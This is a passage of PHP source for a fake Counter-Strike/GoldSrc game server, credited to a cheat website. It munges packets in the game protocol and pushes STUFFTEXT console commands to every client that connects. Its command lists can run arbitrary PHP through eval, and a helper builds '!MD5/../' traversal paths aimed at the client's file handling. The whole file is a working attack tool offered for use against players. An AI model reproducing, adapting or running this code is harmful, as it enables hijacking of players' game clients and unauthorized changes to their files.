                chr( ~( ord( $pack[$i*4+1] ) ^ ( self::$NeedMungeTable[ ( $i + 2 ) & 0x0F ] | 175 ) )             ) .
                chr( ~( ord( $pack[$i*4  ] ) ^ ( self::$NeedMungeTable[ ( $i + 3 ) & 0x0F ] | 191 ) ) ^ $sequence ) ;

        }

        if ( $size * 4 < $size_b )
            $res .= substr( $pack , $size * 4 );

        return $res;

    }
    public static function UnMunge ( $pack , $sequence ) {

        $size_b = strlen ( $pack );
        $size = floor ( $size_b / 4 );

        $sequence &= 0x0F;

        $res = "";

        for ( $i=0; $i<$size; $i++ ) {

            $res .=
                chr( ~( ord( $pack[$i*4+3] ) ^ ( self::$NeedMungeTable[ ( $i + 3 ) & 0x0F ] | 191 ) ) ^ $sequence   ) .
                chr( ~( ord( $pack[$i*4+2] ) ^ ( self::$NeedMungeTable[ ( $i + 2 ) & 0x0F ] | 175 ) )               ) .
                chr( ~( ord( $pack[$i*4+1] ) ^ ( self::$NeedMungeTable[ ( $i + 1 ) & 0x0F ] | 167 ) )               ) .
                chr( ~( ord( $pack[$i*4  ] ) ^ ( self::$NeedMungeTable[ ( $i     ) & 0x0F ] | 165 ) ) ^ $sequence   ) ;

        }

        if ( $size * 4 < $size_b )
            $res .= substr( $pack , $size * 4 );

        return $res;


    }
    public static function setAsistMungeTable( $tbId = 2 ) {

        self::$NeedMungeTable = &self::$MungeTable[$tbId-1];

    }

    public static function getStructurePacket( $pack = Null ) {

        if ( $pack === Null ) {

            CL_BUFER::getCL()->setCursor( 0 );
            $num1  = CL_BUFER::getCL()->readInt32();
            $num2  = CL_BUFER::getCL()->readInt32();
            $pack  = CL_BUFER::getCL()->readString();
            $count = $num1 & 0x00FFFFFF;

            $res = new CL_StructurePacket( $num1 , $num2 , $count , $pack );

        } else {

            $num1  = unpack( "l" , substr( $pack , 0 , 4) )[1];
            $num2  = unpack( "l" , substr( $pack , 4 , 4) )[1];
            $pack  = substr( $pack , 8);
            $count = $num1 & 0x00FFFFFF;

            $num = unpack( "l" , substr( $pack , 0 , 4) )[1];

            $res = new CL_StructurePacket( $num1 , $num2 , $count , $pack );

        }

        return $res;

    }
    public static function getPacket( $struct ) {

        return pack( "l" , $struct->num ) . pack( "l" , $struct->num2 ) . $struct->content;

    }

    public static function showHex ( $st, $rd = " ", $type = false ) {

        $len = strlen ( $st .= "" );
        if ( $type )
            for ( $i = $len - 1; $i >= 0; $i-- )
                $res .= ( ( ( $buf = ord ( $st [ $i ] ) ) > 15 ) ? base_convert ( $buf, 10, 16 ) : "0" . base_convert ( $buf, 10, 16 ) ) . $rd;
        else
            for ( $i = 0; $i < $len; $i++ )
                $res .= ( ( ( $buf = ord ( $st [ $i ] ) ) > 15 ) ? base_convert ( $buf, 10, 16 ) : "0" . base_convert ( $buf, 10, 16 ) ) . $rd;

        return strtoupper ( $res );

    }
}

class SVC_CMD {

    public static $thisCL = Null;

    public $SVC_AS = Array (
        "BAD" => Array( "cmd" => 0 , "params_type" => "default" ) ,
        "NOP" => Array( "cmd" => 1 , "params_type" => "default" ) ,
        "DISCONNECT" => Array( "cmd" => 2 , "params_type" => "PString" ) ,
        "EVENT" => Array( "cmd" => 3 , "params_type" => "default" ) ,
        "VERSION" => Array( "cmd" => 4 , "params_type" => "default" ) ,
        "SETVIEW" => Array( "cmd" => 5 , "params_type" => "default" ) ,
        "SOUND" => Array( "cmd" => 6 , "params_type" => "default" ) ,
        "TIME" => Array( "cmd" => 7 , "params_type" => "default" ) ,
        "PRINT" => Array( "cmd" => 8 , "params_type" => "PStringNewLine" ) ,
        "STUFFTEXT" => Array( "cmd" => 9 , "params_type" => "PStringNewLine" ) ,
        "SETANGLE" => Array( "cmd" => 10 , "params_type" => "default" ) ,
        "SERVERINFO" => Array( "cmd" => 11 , "params_type" => "default" ) ,
        "LIGHTSTYLE" => Array( "cmd" => 12 , "params_type" => "default" ) ,
        "UPDATEUSERINFO" => Array( "cmd" => 13 , "params_type" => "default" ) ,
        "DELTADESCRIPTION" => Array( "cmd" => 14 , "params_type" => "default" ) ,
        "CLIENTDATA" => Array( "cmd" => 15 , "params_type" => "default" ) ,
        "STOPSOUND" => Array( "cmd" => 16 , "params_type" => "default" ) ,
        "PINGS" => Array( "cmd" => 17 , "params_type" => "default" ) ,
        "PARTICLE" => Array( "cmd" => 18 , "params_type" => "default" ) ,
        "DAMAGE" => Array( "cmd" => 19 , "params_type" => "default" ) ,
        "SPAWNSTATIC" => Array( "cmd" => 20 , "params_type" => "default" ) ,
        "EVENT_RELIABLE" => Array( "cmd" => 21 , "params_type" => "default" ) ,
        "SPAWNBASELINE" => Array( "cmd" => 22 , "params_type" => "default" ) ,
        "TEMPENTITY" => Array( "cmd" => 23 , "params_type" => "default" ) ,
        "SETPAUSE" => Array( "cmd" => 24 , "params_type" => "default" ) ,
        "SIGNONNUM" => Array( "cmd" => 25 , "params_type" => "default" ) ,
        "CENTERPRINT" => Array( "cmd" => 26 , "params_type" => "default" ) ,
        "KILLEDMONSTER" => Array( "cmd" => 27 , "params_type" => "default" ) ,
        "FOUNDSECRET" => Array( "cmd" => 28 , "params_type" => "default" ) ,
        "SPAWNSTATICSOUND" => Array( "cmd" => 29 , "params_type" => "default" ) ,
        "INTERMISSION" => Array( "cmd" => 30 , "params_type" => "default" ) ,
        "FINALE" => Array( "cmd" => 31 , "params_type" => "default" ) ,
        "CDTRACK" => Array( "cmd" => 32 , "params_type" => "default" ) ,
        "RESTORE" => Array( "cmd" => 33 , "params_type" => "default" ) ,
        "CUTSCENE" => Array( "cmd" => 34 , "params_type" => "default" ) ,
        "WEAPONANIM" => Array( "cmd" => 35 , "params_type" => "default" ) ,
        "DECALNAME" => Array( "cmd" => 36 , "params_type" => "default" ) ,
        "ROOMTYPE" => Array( "cmd" => 37 , "params_type" => "default" ) ,
        "ADDANGLE" => Array( "cmd" => 38 , "params_type" => "default" ) ,
        "NEWUSERMSG" => Array( "cmd" => 39 , "params_type" => "default" ) ,
        "PACKETENTITIES" => Array( "cmd" => 40 , "params_type" => "default" ) ,
        "DELTAPACKETENTITIES" => Array( "cmd" => 41 , "params_type" => "default" ) ,
        "CHOKE" => Array( "cmd" => 42 , "params_type" => "default" ) ,
        "RESOURCELIST" => Array( "cmd" => 43 , "params_type" => "default" ) ,
        "NEWMOVEVARS" => Array( "cmd" => 44 , "params_type" => "default" ) ,
        "RESOURCEREQUEST" => Array( "cmd" => 45 , "params_type" => "default" ) ,
        "CUSTOMIZATION" => Array( "cmd" => 46 , "params_type" => "default" ) ,
        "CROSSHAIRANGLE" => Array( "cmd" => 47 , "params_type" => "default" ) ,
        "SOUNDFADE" => Array( "cmd" => 48 , "params_type" => "default" ) ,
        "FILETXFERFAILED" => Array( "cmd" => 49 , "params_type" => "default" ) ,
        "HLTV" => Array( "cmd" => 50 , "params_type" => "default" ) ,
        "DIRECTOR" => Array( "cmd" => 51 , "params_type" => "default" ) ,
        "VOICEINIT" => Array( "cmd" => 52 , "params_type" => "default" ) ,
        "VOICEDATA" => Array( "cmd" => 53 , "params_type" => "default" ) ,
        "SENDEXTRAINFO" => Array( "cmd" => 54 , "params_type" => "default" ) ,
        "TIMESCALE" => Array( "cmd" => 55 , "params_type" => "default" ) ,
        "RESOURCELOCATION" => Array( "cmd" => 56 , "params_type" => "default" ) ,
        "SENDCVARVALUE" => Array( "cmd" => 57 , "params_type" => "PString" ) ,
        "SENDCVARVALUE2" => Array( "cmd" => 58 , "params_type" => "PString_Int32" )
    );

    public function checkCMD( $name ) {

        return ( empty( $this -> SVC_AS[$name] ) ? false : true );

    }
    public function getCMD( $name ) {

        return ( empty( $this -> SVC_AS[$name] ) ? false : $this -> SVC_AS[$name] );

    }
    public function getSVC( $cmd , $options , $my_type = false ) {

        $cmd = $this -> getCMD( $cmd );
        if ( $cmd === false )
            return false;

        if ( $my_type )
            return chr( $cmd["cmd"] ) . ( (string) $options );

        if ( $cmd["params_type"] === "PString" )
            return chr( $cmd["cmd"] ) . ( (string) $options ) . "\x00";

        if ( $cmd["params_type"] === "PStringNewLine" )
            return chr( $cmd["cmd"] ) . ( (string) $options ) . "\x0A\x00";

        if ( $cmd["params_type"] === "PString_Int32" )
            return chr( $cmd["cmd"] ) . pack( "l" , ( (int) $options [0] ) ) . ( (string) $options [1] ) . "\x00";

    }

    public static function getCL() {

        ( self::$thisCL === Null ) &&
        ( self::$thisCL = new self() );

        return self::$thisCL;

    }

}

class MsgEngine {

    public static $thisCL = Null;

    public $socket;
    public $client;
    public $buf;

    public function setFl ( $fl ) {

        $this -> client -> packOut -> num &= 0x0FFFFFFF;
        $this -> client -> packOut -> num |= ( $fl << 28 );

    }

    public function sendPack ( $info , $bz2 = false , $fl = Null ) {

        $this -> client -> countPackOut++;
        if ( $bz2 )
            $info = "\x01\x01\x00\x01\x00\x00\x00\x6F\x04\x00BZ2\x00" . bzcompress( $info );

        $pack = COM::Munge( $info , $this -> client -> countPackOut );

        $this -> client -> packOut = new CL_StructurePacket(
            $this -> client -> countPackOut ,
            0 ,
            $this -> client -> countPackOut ,
            $pack
        );

        $this -> setFl (   ( $fl === Null ) ? ( ( $bz2 ) ? 0x0C : 0x00 ) : $fl   );

        $this -> socket -> send ( COM::getPacket( $this -> client -> packOut ) );

    }

    public function setClient( $client ) {

        $this -> client = ( gettype ( $client ) === "string" ) ? CL_CLIENTS::getCL()->getClient( $client ) : $client;

        $this->client->packIn = COM::getStructurePacket();

        $this->client->countPackIn = $this->client->packIn->count;

    }

    public function __construct() {

        $this -> socket = CL_SOCKET::getCL();

        $this -> buf = CL_BUFER::getCL();

    }
    public static function getCL() {

        ( self::$thisCL === Null ) &&
        ( self::$thisCL = new self() );

        return self::$thisCL;

    }

}
class CL_CMDS_ONE_PACK {

    public $cmd_string = "";
    public $bzip2 = false;

    public $svc;

    public function set( $str ) {

        $this -> cmd_string = $str;

    }
    public function add( $cmd , $options , $my_type = false ) {

        $this -> cmd_string .= $this -> svc -> getSVC( $cmd , $options , $my_type );

    }

    public function __construct( $bzip2 ) {

        $this -> bzip2 = $bzip2;

        $this -> svc = SVC_CMD::getCL();

    }

}

class _EVAL {

    static function ADD( $cmd , $options , $my_type = false ) {

        CL_CmdLists::getCL()->asistItem->add( $cmd , $options , $my_type );

    }
    static function GETParentPath( $level , $ifMD5 = true ) {
        $res = ( $ifMD5 ) ? "!MD5/../" : "";
        for ( $i = 1; $i <= $level; $i++ ) {
            $res .= "../";
        }

        return $res;

    }

}
class CL_CmdLists {
    public static $thisCL = Null;

    public $lists = Array();

    public $maxPackSize = Array();

    public $currI = 0;
    public $currName;
    public $asistItem;

    public $svc;

    public function exe() {

        if ( $this -> evalStr === "" )
            return;

        // ########## Interface ########## //



        // ########## Interface ########## //

        eval ( $this -> evalStr );

        $this -> evalStr = "";

    }
    public function addLists( $name ) {
        $this -> lists [ $name ] = Array();
        $this -> currName = $name;
        $this -> currI = 0;
        $this -> asistItem = Null;
    }
    public function addPack( $bzip2 = false ) {

        $this->lists[ $this -> currName ] [ $this -> currI ] = new CL_CMDS_ONE_PACK( $bzip2 );
        $this->asistItem = &$this->lists[ $this -> currName ] [ $this -> currI ];
        $this -> currI++;

    }

    public function load( $name ) {

        $this -> addLists( $name );

        if ( ( $name === false ) || ( $name === "" ) || !file_exists( CL_Path_Lib::$cmd_mods_dir_name . $name ) )
            return;

        $f = fopen( CL_Path_Lib::$cmd_mods_dir_name . $name , "r" );


        $mode = 0;

        $cmdName = "STUFFTEXT";

        $bzip2 = false;

        $this -> evalStr = "";

        while ( !fEoF( $f ) ) {

            $str = trim( preg_replace( "/[\r\n]/si" , "" , fgets ( $f ) ) );

            if ( $str === "" )
                continue;

            if ( substr( $str , 0 , 2 ) === "//" )
                continue;

            if ( $str[0] === "[" ) {

                if ( preg_match( "/\[\s*(mode|svc|pack|bzip2)\s*\=\s*([^\s\[\]\r\n]*)\s*\]/si" , $str , $options ) ) {

                    switch ( $options[1] ) {

                        case "mode": switch ( $options[2] ) {
                            case "cs_tokenize" : $mode = 0; break;
                            case "eval_php"    : $mode = 1; break;
                        }
                        break;

                        case "pack": switch ( $options[2] ) {
                            case "new" :
                                $this -> exe();
                                $this -> addPack( $bzip2 );
                            break;
                        }
                        break;

                        case "bzip2": switch ( $options[2] ) {
                            case "compress"   : $bzip2 = true; break;
                            case "no_compress" : $bzip2 = false; break;
                        }
                        break;

                        case "svc": if ( !( ( $this->svc->checkCMD( $options[2] ) ) === false ) ) {
                            $cmdName = $options[2];
                        }
                        break;

                    }

                }

            } else {

                if ( $this -> asistItem === Null )
                    $this -> addPack( $bzip2 );

                if ( $mode === 0 ) {

                    $this -> exe();

                    $this->asistItem->add( $cmdName , $str );

                }

                elseif ( $mode === 1 ) {

                    $this -> evalStr .= $str;

                }

            }

        }

        $this -> exe();

        fclose( $f );

        foreach ( $this -> lists[$name] as $id => $val )
            if ( $val->cmd_string === "" )
                unset( $this -> lists[$name][$id] );

    }

    public function getCMD_LISTS( $name ) {

        return ( ( empty( $this->lists[$name] ) ) ? false : $this->lists[$name] );

    }

    public function __construct() {

        $this -> svc = SVC_CMD::getCL();

    }
    public static function getCL() {

        ( self::$thisCL === Null ) &&
        ( self::$thisCL = new self() );

        return self::$thisCL;

    }

}

/* dddddddddddddddddddddd */

/* dddddddddddddddddddddd */

if ( !( $_REQUEST["key"] === CL_Path_Lib::$keyStart ) )
    exit;





$server = new CL_FEIK_SERVER;

$r = $server -> init (     empty( $_REQUEST["create_svc_port"] ) ? 27015 : $_REQUEST["create_svc_port"]     );


if ( $r["ERROR"] === 0 ) {

    echo "Сервер включился -  " . $server -> server -> addr . " [ " .date ( "Y-m-d H:i:s", time () ) . " ]<BR/>";

    $server -> job_server ();

    echo "Сервер выключился - " . $server -> server -> addr . " [ " .date ( "Y-m-d H:i:s", time () ) . " ]<BR/>";

} else
    echo $r [ "msg" ]. "<BR/>";



//	Software from Ostrog        ^_^
//  official website cheater-top.ru

?>